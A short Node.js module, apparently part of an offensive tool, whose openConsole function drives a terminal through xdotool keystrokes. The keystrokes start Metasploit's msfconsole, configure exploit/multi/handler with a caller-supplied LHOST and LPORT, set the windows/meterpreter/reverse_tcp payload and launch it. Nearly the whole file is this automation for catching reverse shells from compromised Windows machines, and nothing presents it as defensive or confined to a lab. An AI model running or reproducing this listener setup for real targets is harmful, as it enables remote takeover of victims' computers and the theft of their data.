exports.openConsole = (exec, { ip, port }) => {
  const enterKey = "xdotool key KP_Enter";

  const command =
    `xdotool type msfconsole && ` +
    `${enterKey}  && ` +
    `xdotool type "use exploit/multi/handler" && ` +
    `${enterKey}  && ` +
    `xdotool type "set LHOST ${ip}" && ` +
    `${enterKey}  && ` +
    `xdotool type "set LPORT ${port}" && ` +
    `${enterKey} && ` +
    `xdotool type "set payload windows/meterpreter/reverse_tcp" && ` +
    `${enterKey} && ` +
    `xdotool type "exploit" && ` +
    `${enterKey}`;

  // console.log(command);

  exec(command, (error, stdout, stderr) => {
    console.log(stderr);
    console.log(stdout);
    if (error !== null) {
      console.log(error);
    }
  });
};
